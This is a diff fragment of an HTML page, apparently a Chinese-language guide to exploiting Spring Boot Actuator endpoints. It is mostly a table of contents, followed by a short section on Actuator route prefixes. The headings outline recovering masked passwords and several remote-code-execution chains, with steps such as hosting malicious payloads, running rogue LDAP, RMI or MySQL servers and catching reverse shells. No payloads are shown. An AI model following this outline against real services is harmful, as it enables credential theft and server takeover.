+          &lt;li&gt;&lt;a href=&quot;#0x03%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%80&quot;&gt;0x03：获取被星号脱敏的密码的明文 (方法一)&lt;/a&gt;
+            &lt;ul&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95&quot;&gt;利用方法：&lt;/a&gt;
+                &lt;ul&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D&quot;&gt;步骤一： 找到想要获取的属性名&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C-jolokia-%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3-mbean-%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87&quot;&gt;步骤二： jolokia 调用相关 Mbean 获取明文&lt;/a&gt;&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x04%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%BA%8C&quot;&gt;0x04：获取被星号脱敏的密码的明文 (方法二)&lt;/a&gt;
+            &lt;ul&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1&quot;&gt;利用方法：&lt;/a&gt;
+                &lt;ul&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-1&quot;&gt;步骤一： 找到想要获取的属性名&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-http-%E8%AF%B7%E6%B1%82&quot;&gt;步骤二： 使用 nc 监听 HTTP 请求&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E8%AE%BE%E7%BD%AE-eurekaclientserviceurldefaultzone-%E5%B1%9E%E6%80%A7&quot;&gt;步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%9B%9B-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE&quot;&gt;步骤四： 刷新配置&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%94-%E8%A7%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%80%BC&quot;&gt;步骤五： 解码属性值&lt;/a&gt;&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x05%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%89&quot;&gt;0x05：获取被星号脱敏的密码的明文 (方法三)&lt;/a&gt;
+            &lt;ul&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-2&quot;&gt;利用方法：&lt;/a&gt;
+                &lt;ul&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-2&quot;&gt;步骤一： 找到想要获取的属性名&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-http-%E8%AF%B7%E6%B1%82-1&quot;&gt;步骤二： 使用 nc 监听 HTTP 请求&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E8%A7%A6%E5%8F%91%E5%AF%B9%E5%A4%96-http-%E8%AF%B7%E6%B1%82&quot;&gt;步骤三： 触发对外 http 请求&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%9B%9B-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-1&quot;&gt;步骤四： 刷新配置&lt;/a&gt;&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x06%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E5%9B%9B&quot;&gt;0x06：获取被星号脱敏的密码的明文 (方法四)&lt;/a&gt;
+            &lt;ul&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-3&quot;&gt;利用方法：&lt;/a&gt;
+                &lt;ul&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-3&quot;&gt;步骤一： 找到想要获取的属性名&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%B8%8B%E8%BD%BD-jvm-heap-%E4%BF%A1%E6%81%AF&quot;&gt;步骤二： 下载 jvm heap 信息&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E4%BD%BF%E7%94%A8-mat-%E8%8E%B7%E5%BE%97-jvm-heap-%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87&quot;&gt;步骤三： 使用 MAT 获得 jvm heap 中的密码明文&lt;/a&gt;&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#%E4%BA%8C%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&quot;&gt;二：远程代码执行&lt;/a&gt;
+        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x01whitelabel-error-page-spel-rce&quot;&gt;0x01：whitelabel error page SpEL RCE&lt;/a&gt;
+            &lt;ul&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-4&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-4&quot;&gt;利用方法：&lt;/a&gt;
+                &lt;ul&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E6%AD%A3%E5%B8%B8%E4%BC%A0%E5%8F%82%E5%A4%84&quot;&gt;步骤一：找到一个正常传参处&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%A7%E8%A1%8C-spel-%E8%A1%A8%E8%BE%BE%E5%BC%8F&quot;&gt;步骤二：执行 SpEL 表达式&lt;/a&gt;&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x02spring-cloud-snakeyaml-rce&quot;&gt;0x02：spring cloud SnakeYAML RCE&lt;/a&gt;
+            &lt;ul&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-5&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-5&quot;&gt;利用方法：&lt;/a&gt;
+                &lt;ul&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%98%E7%AE%A1-yml-%E5%92%8C-jar-%E6%96%87%E4%BB%B6&quot;&gt;步骤一： 托管 yml 和 jar 文件&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E8%AE%BE%E7%BD%AE-springcloudbootstraplocation-%E5%B1%9E%E6%80%A7&quot;&gt;步骤二： 设置 spring.cloud.bootstrap.location 属性&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE&quot;&gt;步骤三： 刷新配置&lt;/a&gt;&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-1&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x03eureka-xstream-deserialization-rce&quot;&gt;0x03：eureka xstream deserialization RCE&lt;/a&gt;
+            &lt;ul&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-6&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-6&quot;&gt;利用方法：&lt;/a&gt;
+                &lt;ul&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9E%B6%E8%AE%BE%E5%93%8D%E5%BA%94%E6%81%B6%E6%84%8F-xstream-payload-%E7%9A%84%E7%BD%91%E7%AB%99&quot;&gt;步骤一：架设响应恶意 XStream payload 的网站&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3&quot;&gt;步骤二：监听反弹 shell 的端口&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-eurekaclientserviceurldefaultzone-%E5%B1%9E%E6%80%A7&quot;&gt;步骤三：设置 eureka.client.serviceUrl.defaultZone 属性&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE&quot;&gt;步骤四：刷新配置&lt;/a&gt;&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-2&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x04jolokia-logback-jndi-rce&quot;&gt;0x04：jolokia logback JNDI RCE&lt;/a&gt;
+            &lt;ul&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-7&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-7&quot;&gt;利用方法：&lt;/a&gt;
+                &lt;ul&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84-mbeans&quot;&gt;步骤一：查看已存在的 MBeans&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%98%E7%AE%A1-xml-%E6%96%87%E4%BB%B6&quot;&gt;步骤二：托管 xml 文件&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81&quot;&gt;步骤三：准备要执行的 Java 代码&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1&quot;&gt;步骤四：架设恶意 ldap 服务&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%85%AD%E4%BB%8E%E5%A4%96%E9%83%A8-url-%E5%9C%B0%E5%9D%80%E5%8A%A0%E8%BD%BD%E6%97%A5%E5%BF%97%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6&quot;&gt;步骤六：从外部 URL 地址加载日志配置文件&lt;/a&gt;&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-3&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x05jolokia-realm-jndi-rce&quot;&gt;0x05：jolokia Realm JNDI RCE&lt;/a&gt;
+            &lt;ul&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-8&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-8&quot;&gt;利用方法：&lt;/a&gt;
+                &lt;ul&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84-mbeans-1&quot;&gt;步骤一：查看已存在的 MBeans&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81&quot;&gt;步骤二：准备要执行的 Java 代码&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89%E6%89%98%E7%AE%A1-class-%E6%96%87%E4%BB%B6&quot;&gt;步骤三：托管 class 文件&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-rmi-%E6%9C%8D%E5%8A%A1&quot;&gt;步骤四：架设恶意 rmi 服务&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3-1&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%85%AD%E5%8F%91%E9%80%81%E6%81%B6%E6%84%8F-payload&quot;&gt;步骤六：发送恶意 payload&lt;/a&gt;&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-4&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x06h2-database-query-rce&quot;&gt;0x06：h2 database query RCE&lt;/a&gt;
+            &lt;ul&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-9&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-9&quot;&gt;利用方法：&lt;/a&gt;
+                &lt;ul&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80%E8%AE%BE%E7%BD%AE-springdatasourcehikariconnection-test-query-%E5%B1%9E%E6%80%A7&quot;&gt;步骤一：设置 spring.datasource.hikari.connection-test-query 属性&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8&quot;&gt;步骤二：重启应用&lt;/a&gt;&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-5&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-5&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x07h2-database-console-jndi-rce&quot;&gt;0x07：h2 database console JNDI RCE&lt;/a&gt;
+            &lt;ul&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-10&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-10&quot;&gt;利用方法：&lt;/a&gt;
+                &lt;ul&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80%E8%AE%BF%E9%97%AE%E8%B7%AF%E7%94%B1%E8%8E%B7%E5%BE%97-jsessionid&quot;&gt;步骤一：访问路由获得 jsessionid&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81-1&quot;&gt;步骤二：准备要执行的 Java 代码&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89%E6%89%98%E7%AE%A1-class-%E6%96%87%E4%BB%B6-1&quot;&gt;步骤三：托管 class 文件&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1-1&quot;&gt;步骤四：架设恶意 ldap 服务&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3-2&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%85%AD%E5%8F%91%E5%8C%85%E8%A7%A6%E5%8F%91-jndi-%E6%B3%A8%E5%85%A5&quot;&gt;步骤六：发包触发 JNDI 注入&lt;/a&gt;&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-6&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#0x08mysql-jdbc-deserialization-rce&quot;&gt;0x08：mysql jdbc deserialization RCE&lt;/a&gt;
+            &lt;ul&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-11&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-11&quot;&gt;利用方法：&lt;/a&gt;
+                &lt;ul&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E7%8E%AF%E5%A2%83%E4%BE%9D%E8%B5%96&quot;&gt;步骤一：查看环境依赖&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-rogue-mysql-server&quot;&gt;步骤二：架设恶意 rogue mysql server&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-springdatasourceurl-%E5%B1%9E%E6%80%A7&quot;&gt;步骤三：设置 spring.datasource.url 属性&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-1&quot;&gt;步骤四：刷新配置&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%94%E8%A7%A6%E5%8F%91%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2&quot;&gt;步骤五：触发数据库查询&lt;/a&gt;&lt;/li&gt;
+                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%85%AD%E6%81%A2%E5%A4%8D%E6%AD%A3%E5%B8%B8-jdbc-url&quot;&gt;步骤六：恢复正常 jdbc url&lt;/a&gt;&lt;/li&gt;
+                &lt;/ul&gt;
+              &lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-6&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-7&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
+              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-7&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;零路由和版本&quot;&gt;零：路由和版本&lt;/h2&gt;
+
+&lt;h3 id=&quot;0x01路由知识&quot;&gt;0x01：路由知识&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Spring Boot 1.x 版本默认内置路由的根路径以  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; 开始，2.x 则统一以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator&lt;/code&gt; 开始&lt;/li&gt;
+  &lt;li&gt;有些程序员会自定义 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/manage&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/management&lt;/code&gt; 或 &lt;strong&gt;项目相关名称&lt;/strong&gt; 为根路径&lt;/li&gt;
+  &lt;li&gt;默认内置路由名字，如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 有时候也会被程序员修改，如修改成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/appenv&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
